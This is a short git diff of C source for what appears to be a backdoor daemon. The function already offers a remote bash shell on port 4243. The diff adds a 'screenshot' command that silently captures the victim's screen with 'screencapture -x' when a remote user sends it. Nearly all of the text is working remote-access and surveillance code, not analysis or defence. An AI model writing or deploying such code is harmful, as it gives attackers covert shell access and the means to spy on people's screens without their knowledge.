@@ -93,6 +93,7 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 	char		buffer[BUFFSIZE + 1];
 	ssize_t		valrecv = 0;
 	char	*shell[] = {"/bin/bash", NULL};
+	char	*screen[] = {"screencapture", "-x", "test1.png", NULL};
 	t_users		users;
 
 	memset(&users, 0, sizeof(users));
@@ -166,6 +167,11 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 						}
 						if (!strcmp(buffer, "?"))
 							send(users.sd, "'shell'	Spawn remote shell on 4243\n> ", 37, 0);
+						else if (!strcmp(buffer, "screenshot"))
+						{
+							if (execve(screen[0], screen, envp) == -1)
+								printf("error\n");
+						}
 						if (!strcmp(buffer, "shell"))
 						{
 							for(int i=0; i<3; i++)
